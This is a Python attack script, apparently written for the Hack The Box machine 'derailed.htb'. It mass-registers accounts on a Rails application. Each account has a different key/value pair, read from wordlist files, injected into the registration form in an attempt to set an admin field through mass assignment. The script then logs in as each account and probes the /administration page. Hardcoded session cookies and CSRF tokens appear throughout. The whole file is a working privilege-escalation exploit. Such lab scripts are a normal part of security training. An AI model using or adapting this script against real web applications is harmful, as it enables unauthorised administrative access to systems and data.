#!/usr/bin/python3

import requests
import random
import string
from colorama import Style, Fore

session = requests.session()

def generateRandomString(length: int = 8, charset: str = string.ascii_lowercase) -> str:
    return "".join(random.choices(charset, k=length))

def get_register():
    pass

def register():
    with open("testees.txt", "w") as testees:
        with open("admin_field_keys.txt", "r") as keys:
            with open("admin_field_values.txt", "r") as values:
                
                many_keys = keys.readlines()
                many_values = values.readlines()
                
                for key in many_keys:
                    for value in many_values:
                        username = generateRandomString()
                        print(f"Registering: {username}:{key.strip()}:{value.strip()}")
                        testees.write(f"{username}:{key.strip()}:{value.strip()}\n")
                        do_register(username, key.strip(), value.strip())

def do_register(username:str, admin_field_key:str, admin_field_value:str):
    url = "http://derailed.htb:3000/register"
    cookies = {"_simple_rails_session": "mXBL6czS2N9yQr03E8GYbMe7oFtkX2rEAwfF5x%2F5JS559RwGiCZC6N7PKkbYcHO7NW4cOQhDLeTgSuJzvU3ULeQ%2BLTngl%2FhKbDmrpDS8GeXJNo45k6%2F2UOPLIMDERxTWZbEbVLuSoIflRLmmu1evuRuizac7ox5skK9Yt4al0JpTX23svNA4%2BTDhy6pIARrZnmBDqmu2OTuu32zIFzouy0hKUb3oZe8Y%2B6hA40nnM5Jp4isgLZ9JvB0uZvHwPgl13j1C00DQGdch2nKNEkVWx%2FHfE%2BGRy1PzO0MpTcI%3D--QiaqDeet7NuhCKEV--yIPGD%2BWsJFuJ5FjP8Zfjyw%3D%3D"}
    data = {"authenticity_token": "gghKwBRNL3Psf00fNHKoxw8BzshWeBa2SOXIvOAIh6OOpNLv4I0g3CSxKpMGS-3G1V791gEwvbX8ohPvYgFCAQ", "user[username]": username, "user[password]": "password123", "user[password_confirmation]": "password123", admin_field_key: admin_field_value}
    response = session.post(url, cookies=cookies, data=data)
    
    
    if response.status_code != 200:
        print(f"{Fore.RED}User registration failed with key[{admin_field_key}] value[{admin_field_value}]. Status code: [{response.status_code}]")
        exit()

def admin_login():
    with open("./testees.txt", "r") as testees:
        usernames = testees.readlines()

        for line in usernames:
            username = line.split(':')[0]
            do_admin_login(username)

def do_admin_login(admin_username:str):
    url = "http://derailed.htb:3000/login"
    cookies = {"_simple_rails_session": "O291rGvK%2BSVrzimekza53ixX3plKFvvNDmZDViPuidR8XAbInNFQPd0%2BuF%2BDxTu5eBUspeLTbNQ0e2ehlKuR5XD8sIOJZi8jxy0QPOYttCFIVwoWkIYmC%2FsCw%2FWgBbKby6paWrZ%2FoEhnQIAI%2BuKUDYqkA6GC0dE%2BVa5l%2FAEjsYQnT00Pe3n%2BZAW4Qv1jalUFQ1r7T3%2BUBlLCA8GcUwqo3dNbnJwFrFLGZyF7cVmf44wsPQ1dMIAlc8VWNFQyZftCK6QBgzgC4gPkfUd4BJhwuaR6zgTDbYo4IcE62VY%3D--ET0IlGT3tANKqzjE--N0uNrPzHxfR0Dw0GHuJBOw%3D%3D"}
    data = {"authenticity_token": "w3Xrx8xkzbp7YSE380mKhhfGNywOS9Gfsx5bbW2GodvZ4q7iNzuyDSPNDYKQYol-2DuGiqjdRUBpL5JEv7Y9lA", "session[username]": admin_username, "session[password]": "password123", "button": ''}
    response = session.post(url, cookies=cookies, data=data)

    if response.status_code == 200:
        go_to_administration(admin_username)


def go_to_administration(username:str):
    url = "http://derailed.htb:3000/administration"
    response = session.get(url)

    if response.status_code == 200:
        if "/login" not in response.url:
            print(f"We got admin user: {username}")
            exit()
        else:
            print(f"Failed with user {username}")



# register()
# print(f"{Fore.GREEN}Users registration successful!")
admin_login()